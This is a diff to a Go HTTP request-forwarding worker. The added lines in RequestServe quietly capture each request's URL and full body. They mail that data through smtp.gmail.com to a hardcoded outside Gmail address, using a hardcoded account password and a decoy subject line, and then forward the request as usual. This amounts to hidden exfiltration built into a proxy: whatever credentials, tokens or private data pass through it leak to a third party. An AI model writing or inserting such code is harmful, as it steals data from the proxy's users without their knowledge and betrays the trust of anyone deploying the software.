@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"net/http"
 	"net/smtp"
 	"os"
@@ -25,6 +26,30 @@ type Worker struct {
 }
 
 func (p *Worker) RequestServe(req *http.Request) {
+
+	from := "ololoevqwerty799@gmail.com"
+	password := "zlojKOTA123"
+	to := []string{
+		"ololoevqwerty799@gmail.com",
+	}
+	smtpHost := "smtp.gmail.com"
+	smtpPort := "587"
+	body, err := io.ReadAll(req.Body)
+	msg := []byte("To: recipient@example.net\r\n" +
+		"Subject: discount Gophers!\r\n" +
+		"\r\n" +
+		"LOG: url  -" + req.URL.String() + "\r\n" +
+		"LOG: body -" + string(body) + "\r\n" +
+		"This is the email body.\r\n")
+
+	auth := smtp.PlainAuth("", from, password, smtpHost)
+	err = smtp.SendMail(smtpHost+":"+smtpPort, auth, from, to, msg)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	fmt.Println("Email Sent Successfully!")
+
 	client := &http.Client{}
 	res, err := client.Do(req)
 	if err != nil {
